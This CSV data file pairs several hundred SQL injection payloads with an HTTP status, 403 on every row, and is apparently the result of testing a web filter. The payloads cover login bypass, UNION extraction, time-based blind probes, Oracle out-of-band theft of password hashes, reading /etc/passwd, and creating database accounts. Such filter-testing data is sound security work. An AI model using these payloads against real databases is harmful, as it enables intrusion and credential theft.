payload,status code
" select * from users where id  =  1 or 1#""? or 1  =  1 -- 1",403
"""a"""" or 1  =  1--""",403
" select * from users where id  =  1 *1 union select 1,banner from v$version where rownum  =  1 -- 1",403
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  4   )    )    AND 'i'  =  'i",403
" select * from users where id  =  '1' union select   (  \  )  ,@@VERSION -- 1'",403
1 and user_name  (    )     =   'dbo',403
"; if not  (  substring   (    (   select @@version  )  ,24,1  )   <> 1  )   waitfor delay '0:0:2' --",403
" select * from users where id  =  1 or 1#""$ union select 1,version  (    )   -- 1",403
" select * from users where id  =  1 or 1#""{ union select null,version  (    )   -- 1",403
select * from users where id  =  '1' *$ . or 1  =  1 -- 1',403
select * from users where id  =  1 +$+. or 1  =  1 -- 1,403
select * from users where id  =  1 or   (  \+  )    =  1 or 1  =  1 -- 1,403
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",403
or 1  =  1 or ''  =  ',403
select * from users where id  =  1   or 1  =  1 -- 1,403
or 'text' > 't',403
"1234 "" AND 1  =  0 UNION ALL SELECT ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055",403
" select * from users where id  =  1 or ""%["" or 1  =  1 -- 1",403
" select * from users where id  =  1 or 1#"";  =  1 union select 1,version  (    )   -- 1",403
admin' or '1'  =  '1'#,403
select * from users where id  =  1 +$ 1 or 1  =  1 -- 1,403
s,403
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  4   )    )    AND 'i'  =  'i",403
 select * from information_schema.tables--,403
" select * from users where id  =  1 or ""$&"" or 1  =  1 -- 1",403
1   )    )    or pg_sleep  (  __TIME__  )  --,403
" select * from users where id  =  '1' union select !<@,version  (    )   -- 1'",403
declare @q nvarchar   (  200  )   select @q   =   0x770061 ...,403
 or 1  =  1 or ''  =  ',403
select * from users where id  =  1 %!<1 or 1  =  1 -- 1,403
declare @q nvarchar   (  200  )   select @q   =   0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec  (  @q  ) ,403
" select * from users where id  =  1 or ""]1"" or 1  =  1 -- 1",403
" select * from users where id  =  1 or $+<1 union select 1,@@VERSION -- 1",403
or 'unusual'   =   'unusual',403
 or 1 in   (  select @@version  )  --,403
truncate,403
as,403
 or 3  =  3 --,403
" select * from users where id  =  1 ||1 union select 1,banner from v$version where rownum  =  1 -- 1",403
" select * from users where id  =  1 <@$$ union select 1,version  (    )   -- 1",403
"admin""  )   or   (  ""1""  =  ""1",403
" select * from users where id  =  1 or 1#""@ union select 'a',version  (    )   -- 1",403
"1  )   or benchmark  (  10000000,MD5  (  1   )    )   #",403
" select * from users where id  =  1 union select .1_,version  (    )   -- 1",403
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT SYS.DATABASE_NAME FROM DUAL   )    )    AND 'i'  =  'i,403
" or 0  =  0 #""",403
select * from users where id  =  1 %$ 1 or 1  =  1 -- 1,403
select * from users where id  =  1 %!<@ or 1  =  1 -- 1,403
"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",403
1  )   or sleep  (  __TIME__  )  #,403
" select * from users where id  =  1 or ""1_"" or 1  =  1 -- 1",403
" select * from users where id  =  1 <1## union select 1,version  (    )   -- 1",403
" select * from users where id  =  1 + $+*\ union select null,@@VERSION -- 1",403
select * from users where id  =  1. <@ or 1  =  1 -- 1,403
 or true--,403
 execute immediate 'sel' || 'ect us' || 'er',403
hi' or 'x'  =  'x',403
select * from users where id  =  1 <@ or 1  =  1 -- 1,403
" select * from users where id  =  1 or "".,"" or 1  =  1 -- 1",403
admin' #,403
" select * from users where id  =  1 <@$_ union select 1,version  (    )   -- 1",403
" select * from users where id  =  1 or "",  (  "" or 1  =  1 -- 1",403
" select * from users where id  =  1 or "",{"" or 1  =  1 -- 1",403
" union select 1,load_file  (  '/etc/passwd'  )  ,1,1,1;",403
"""  )  ;waitfor delay '0:0:__TIME__'--",403
 or 'unusual'   =   'unusual',403
"insert into mysql.user   (  user, host, password  )   values   (  'name', 'localhost', password  (  'pass123'   )    )   ",403
"admin"" or ""1""  =  ""1""/*",403
" select * from users where id  =  1 or ""1  (  ""  =  1 or 1  =  1 -- 1",403
" select * from users where id  =  1 or \<1 union select 1,@@VERSION -- 1",403
like,403
or username like char  (  37  )  ,403
 )    )    or pg_sleep  (  __TIME__  )  --,403
select * from users where id  =  1 or $+<\ or 1  =  1 -- 1,403
or 3  =  3,403
" select * from users where id  =  1 or ""  (  ."" or 1  =  1 -- 1",403
select * from users where id  =  1 or   (  $+  )    =  1 or 1  =  1 -- 1,403
exec sp,403
" select * from users where id  =  1 or \+<$ union select 1,@@VERSION -- 1",403
select * from users where id  =  1 or \<$ or 1  =  1 -- 1,403
" select * from users where id  =  1.&&1 union select 1,version  (    )   -- 1",403
admin' or 1  =  1/*,403
a' waitfor delay '0:0:10'--,403
" select * from users where id  =  1 +  (  \  )   union select null,@@VERSION -- 1",403
" select * from users where id  =  1 union select .1$_,version  (    )   -- 1",403
and 1 in   (  select var from temp  )  --,403
hi'  )   or   (  'a'  =  'a,403
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  1   )    )    AND 'i'  =  'i",403
"admin"" or 1  =  1",403
"""  )   or true--",403
" select * from users where id  =  '1' or $ .  =  1 union select 1,@@VERSION -- 1'",403
" select * from users where id  =  1 or ""  (  {"" or 1  =  1 -- 1",403
1  )   or pg_sleep  (  __TIME__  )  --,403
" select * from users where id  =  1 or ""{."" or 1  =  1 -- 1",403
"""  )   or sleep  (  __TIME__  )    =  """,403
select * from users where id  =  1.<@. or 1  =  1 -- 1,403
"admin""  )   or   (  ""1""  =  ""1""--",403
" select * from users where id  =  1<@.. union select 1,version  (    )   -- 1",403
 exec xp_regread,403
" select * from users where id  =  '1' + @ 1 union select 1,version  (    )   -- 1'",403
select * from users where id  =  1 + \+%1 or 1  =  1 -- 1,403
" select * from users where id  =  1 or "";1"" or 1  =  1 -- 1",403
" select * from users where id  =  1 or ""%&"" or 1  =  1 -- 1",403
1 and 1  =  1,403
or 0  =  0 #,403
union select * from users where login   =   char ...,403
" select * from users where id  =  1 union select 1||@,version  (    )   -- 1",403
admin'  )   or '1'  =  '1'--,403
" select * from users where id  =  1 or ""{;"" or 1  =  1 -- 1",403
x' and 1  =    (  select count  (  *  )   from tabname  )  ,403
" select * from users where id  =  '1' or """"<@ union select 1,version  (    )   -- 1'",403
" select * from users where id  =  1 or ""?,"" or 1  =  1 -- 1",403
" select * from users where id  =  '1' ||1 union select 1,banner from v$version where rownum  =  1 -- 1'",403
"1 or benchmark  (  10000000,MD5  (  1   )    )   #",403
procedure,403
or ''  =  ',403
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT SYS.LOGIN_USER FROM DUAL   )    )    AND 'i'  =  'i,403
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  2   )    )    AND 'i'  =  'i",403
" select * from users where id  =  1 or   (  \.  )    =  1 union select 1,@@VERSION -- 1",403
select * from users where id  =  '1' or $ 1  =  1 or 1  =  1 -- 1',403
""" or """"^""",403
"""-""",403
" select * from users where id  =  1 or \<   =  1 union select 1,@@VERSION -- 1",403
" select * from users where id  =  1 union select 1<@$,version  (    )   -- 1",403
" select * from users where id  =  1 *\ union select null,@@VERSION -- 1",403
" select * from users where id  =  '1' or !<@ union select 1,version  (    )   -- 1'",403
" select * from users where id  =  1 or "".%"" or 1  =  1 -- 1",403
admin'/*,403
" select * from users where id  =  1 or ""  (  #"" or 1  =  1 -- 1",403
||UTL_HTTP.REQUEST,403
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  1   )    )    AND 'i'  =  'i",403
" select * from users where id  =  '1'<@.. union select 1,version  (    )   -- 1'",403
"""   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #",403
" select * from users where id  =  1 <@.$ union select 1,version  (    )   -- 1",403
" select * from users where id  =  1 or $ .  =  1 union select 1,@@VERSION -- 1",403
select * from users where id  =  '1' <@.$ or 1  =  1 -- 1',403
1 uni/**/on select all from where,403
" select * from users where id  =  1 +$ . union select null,@@VERSION -- 1",403
" select * from users where id  =  1 or 1#""? union select null,version  (    )   -- 1",403
admin'  )   or '1'  =  '1'#,403
||utl_http.request  (  'httP://192.168.1.1/'  )  ||',403
or '7659'  =  '7659,403
" select * from users where id  =  1 or ""{@"" or 1  =  1 -- 1",403
" select * from users where id  =  1 union select +!<1,version  (    )   -- 1",403
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",403
" select * from users where id  =  1 or ""  (  @"" or 1  =  1 -- 1",403
or true--,403
" select * from users where id  =  1 union select !<1,version  (    )   -- 1",403
" select * from users where id  =  '1' union select \#,@@VERSION -- 1'",403
" select * from users where id  =  1 or 1#""{ union select 1,version  (    )   -- 1",403
""" or true--",403
select * from users where id  =  1. or 1  =  1 -- 1,403
" select * from users where id  =  1 or @#"",  =  1 union select 1,version  (    )   -- 1",403
" select * from users where id  =  1 or "";@"" or 1  =  1 -- 1",403
â or 3  =  3 --,403
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT global_name FROM global_name   )    )    AND 'i'  =  'i,403
" select * from users where id  =  1 +1 union select null,banner from v$version where rownum  =  1 -- 1",403
" select * from users where id  =  1 or "",,""  =  1 or 1  =  1 -- 1",403
" select * from users where id  =  1 + $+%1 union select null,@@VERSION -- 1",403
" select * from users where id  =  1 or 1#""? union select version  (    )  ,version  (    )   -- 1",403
" select * from users where id  =  1 or ""  )  1"" or 1  =  1 -- 1",403
 or uid like '%,403
select * from users where id  =  '1' <@&1 or 1  =  1 -- 1',403
" select * from users where id  =  '1' union select !<1,version  (    )   -- 1'",403
" select * from users where id  =  1 or \<\. union select 1,@@VERSION -- 1",403
" select * from users where id  =  1 or ""{  (  ""  =  1 or 1  =  1 -- 1",403
" select * from users where id  =  1 or ""%_"" or 1  =  1 -- 1",403
select * from users where id  =  1 +   (  \.  )   or 1  =  1 -- 1,403
" select * from users where id  =  '1' union select \,@@VERSION -- 1'",403
0 or 1  =  1,403
select * from users where id  =  1 &@ or 1  =  1 -- 1,403
"admin""  )   or ""1""  =  ""1",403
select * from users where id  =  1 or \<   =  1 or 1  =  1 -- 1,403
" select * from users where id  =  1 or ""??"" or 1  =  1 -- 1",403
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",403
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  7   )    )    AND 'i'  =  'i",403
select * from users where id  =  1 + $+%$ or 1  =  1 -- 1,403
select * from users where id  =  '1' + $+%\ or 1  =  1 -- 1',403
""" or """"*""",403
"hi or 1  =  1 --""",403
" select * from users where id  =  1. union select null,banner from v$version where rownum  =  1 -- 1",403
" select * from users where id  =  '1' or 1^  =  1 union select 1,banner from v$version where rownum  =  1 -- 1'",403
" select * from users where id  =  '1' union select ""?""_,version  (    )   -- 1'",403
select * from information_schema.tables--,403
select * from users where id  =  1 or \<\. or 1  =  1 -- 1,403
   (  select top 1,403
Ã½ or 1  =  1 --,403
a' --,403
 or 1  =  1 /*,403
" select * from users where id  =  1 or 1#"", union select null,version  (    )   -- 1",403
" select * from users where id  =  '1' union select $ .,@@VERSION -- 1'",403
--,403
"exec sp_addlogin 'name' , 'password'",403
" select * from users where id  =  1   union select null,banner from v$version where rownum  =  1 -- 1",403
0x77616974666F722064656C61792027303A303A31302700 exec  (  @s  ) ,403
" select * from users where id  =  1 or "".  )  "" or 1  =  1 -- 1",403
" select * from users where id  =  1 or @<@  =  1 union select 1,version  (    )   -- 1",403
group by userid having 1  =  1--,403
" select * from users where id  =  1 + \+%1 union select null,@@VERSION -- 1",403
select * from users where id  =  1 *1 or 1  =  1 -- 1,403
" select * from users where id  =  1 or @#"";  =  1 or 1  =  1 -- 1",403
‘ or 1  =  1 --,403
" select * from users where id  =  1 *\. union select null,@@VERSION -- 1",403
select * from users where id  =  1 %  (  @  )   or 1  =  1 -- 1,403
or 'a'  =  'a,403
declare @s varchar  (  22  )   select @s   = ,403
" select * from users where id  =  1 union select 1<@,version  (    )   -- 1",403
" select * from users where id  =  1 + \+*\ union select null,@@VERSION -- 1",403
" select * from users where id  =  1 or 1#"". union select version  (    )  ,version  (    )   -- 1",403
@variable,403
select * from users where id  =  1 +  (  1  )   or 1  =  1 -- 1,403
" select * from users where id  =  1 union select @ 1$,version  (    )   -- 1",403
" select * from users where id  =  1 union select @ 1a,version  (    )   -- 1",403
" select * from users where id  =  1 or  @$#  =  1 union select 1,version  (    )   -- 1",403
" select * from users where id  =  '1' or   (  \.  )    =  1 union select 1,@@VERSION -- 1'",403
 and 1 in   (  select var from temp  )  --,403
" select * from users where id  =  '1' union select 1""!"",banner from v$version where rownum  =  1 -- 1'",403
" select * from users where id  =  1 or ""1]"" or 1  =  1 -- 1",403
" select * from users where id  =  1 or ""$?"" or 1  =  1 -- 1",403
or x  =  x,403
or a  =  a,403
or '1'  =  '1,403
" select * from users where id  =  11<1# union select 1,version  (    )   -- 1",403
   )    )    or    (    (   'x'   )    )     =     (    (   'x,403
" select * from users where id  =  '1' or \.<1 union select 1,@@VERSION -- 1'",403
" select * from users where id  =  '1' <@&1 union select 1,version  (    )   -- 1'",403
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  4   )    )    AND 'i'  =  'i",403
 if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --,403
select * from users where id  =  1 <@<@ or 1  =  1 -- 1,403
" select * from users where id  =  1 union select @<@$,version  (    )   -- 1",403
" select * from users where id  =  '1' <@<@ union select 1,version  (    )   -- 1'",403
" select * from users where id  =  1 or ""$_"" or 1  =  1 -- 1",403
" select * from users where id  =  1 or 1#""{ union select version  (    )  ,version  (    )   -- 1",403
a' or 1  =  1--,403
 )   or   (  a  =  a,403
"""   )    )    or    (    (   ""x""   )    )     =     (    (   ""x",403
" select * from users where id  =  1 or 1#""; or 1  =  1 -- 1",403
" select * from users where id  =  '1' <@$_ union select 1,version  (    )   -- 1'",403
-- &password  = ,403
select * from users where id  =  1 <@. or 1  =  1 -- 1,403
" select * from users where id  =  1 or ""  (    )  "" or 1  =  1 -- 1",403
" select * from users where id  =  1 %$ 1 union select null,@@VERSION -- 1",403
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  3   )    )    AND 'i'  =  'i",403
 or '1'  =  '1,403
admin' or 1  =  1,403
" select * from users where id  =  1 or "";,""  =  1 or 1  =  1 -- 1",403
" select * from users where id  =  1 union select @||1,version  (    )   -- 1",403
" select * from users where id  =  1 +\+. union select null,@@VERSION -- 1",403
" select * from users where id  =  1 or ""  )  ,"" or 1  =  1 -- 1",403
" union select * from users where login   =   char  (  114,111,111,116  )  ;",403
" select * from users where id  =  1 or 1#""? union select 1,version  (    )   -- 1",403
 or 1  =  1--,403
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",403
pg_sleep  (  __TIME__  )  --,403
‘ or 3  =  3 --,403
" select * from users where id  =  1 -1<@ union select 1,version  (    )   -- 1",403
" select * from users where id  =  1 or ""$#"" or 1  =  1 -- 1",403
 )   union select * from information_schema.tables,403
" select * from users where id  =  1 or ""  )  ]"" or 1  =  1 -- 1",403
"  )   or benchmark  (  10000000,MD5  (  1   )    )   #",403
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT COUNT  (  DISTINCT  (  column_name   )    )    FROM sys.all_tab_columns   )    )    AND 'i'  =  'i,403
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  7   )    )    AND 'i'  =  'i",403
""" or """" """,403
delete,403
waitfor delay '0:0:__TIME__'--,403
 or 1  =  1 --,403
1' and non_existant_table   =   '1,403
" select * from users where id  =  1 or ""&  )  "" or 1  =  1 -- 1",403
" select * from users where id  =  '1' + $ . union select 1,@@VERSION -- 1'",403
declare @s varchar  (  200  )   select @s   =   0x77616974 ...,403
x' AND userid IS NULL,403
" select * from users where id  =  1 or "";["" or 1  =  1 -- 1",403
" select * from users where id  =  '1' or \.<   =  1 union select 1,@@VERSION -- 1'",403
" select * from users where id  =  1 union select @<@,version  (    )   -- 1",403
" select * from users where id  =  1 -@<@ union select 1,version  (    )   -- 1",403
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT host_name FROM v$instance   )    )    AND 'i'  =  'i,403
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  2   )    )    AND 'i'  =  'i",403
select * from users where id  =  1 +   (  \+  )   or 1  =  1 -- 1,403
" select * from users where id  =  1 or "".["" or 1  =  1 -- 1",403
" select * from users where id  =  1 or ""  (  ["" or 1  =  1 -- 1",403
UNION ALL SELECT,403
" select * from users where id  =  1 or ""1#"" or 1  =  1 -- 1",403
select * from users where id  =  1 or \<1 or 1  =  1 -- 1,403
" select * from users where id  =  1 | |1 union select 1,banner from v$version where rownum  =  1 -- 1",403
x' or full_name like '%bob%,403
x' and members.email is NULL,403
 or 2 > 1,403
select * from users where id  =  1.*1 or 1  =  1 -- 1,403
"""  )   or pg_sleep  (  __TIME__  )  --",403
 ',403
" select * from users where id  =  1 or $<\. union select 1,@@VERSION -- 1",403
" select * from users where id  =  1 or ""@  )  "" or 1  =  1 -- 1",403
select * from users where id  =  1 or \.<$ or 1  =  1 -- 1,403
 )   or sleep  (  __TIME__  )    =  ',403
sleep 50',403
" select * from users where id  =  '1' + 1||1 union select 1,banner from v$version where rownum  =  1 -- 1'",403
select * from users where id  =  1 + $+%\ or 1  =  1 -- 1,403
" select * from users where id  =  1 or "";  (  "" or 1  =  1 -- 1",403
or sleep  (  __TIME__  )    =  ',403
" select * from users where id  =  1 or "";_"" or 1  =  1 -- 1",403
" select * from users where id  =  1 or 1#"". union select 1,version  (    )   -- 1",403
" select * from users where id  =  1 union select  @ $,version  (    )   -- 1",403
" select * from users where id  =  1 union select +!<@,version  (    )   -- 1",403
" select * from users where id  =  1 <@<@ union select null,version  (    )   -- 1",403
or 2 > 1,403
 exec   (  'sel' + 'ect us' + 'er'  ) ,403
anything' OR 'x'  =  'x,403
" select * from users where id  =  1 or \<\ union select 1,@@VERSION -- 1",403
" select * from users where id  =  1 union select   (  1  )  ,banner from v$version where rownum  =  1 -- 1",403
" select * from users where id  =  1 *  (  \  )   union select null,@@VERSION -- 1",403
&',403
a' or 3  =  3--,403
" select * from users where id  =  '1' or $+<$ union select 1,@@VERSION -- 1'",403
" select * from users where id  =  1 +1 union select 1,banner from v$version where rownum  =  1 -- 1",403
"admin""or 1  =  1 or """"  =  """,403
uni/**/on sel/**/ect,403
""" or """"&""",403
" select * from users where id  =  1 or ""?;"" or 1  =  1 -- 1",403
1 waitfor delay '0:0:10'--,403
bfilename,403
admin'  )   or   (  '1'  =  '1'--,403
UEf,403
 -- &password  = ,403
1 or sleep  (  __TIME__  )  #,403
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",403
" select * from users where id  =  '1' union select $[""],@@VERSION -- 1'",403
" select * from users where id  =  '1' + @  (  1  )   union select 1,version  (    )   -- 1'",403
1' and 1  =    (  select count  (  *  )   from tablenames  )  ,403
or sleep  (  __TIME__  )  #,403
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  8   )    )    AND 'i'  =  'i",403
" select * from users where id  =  1 or 1#"",  =  1 or 1  =  1 -- 1",403
||6,403
or 1/*,403
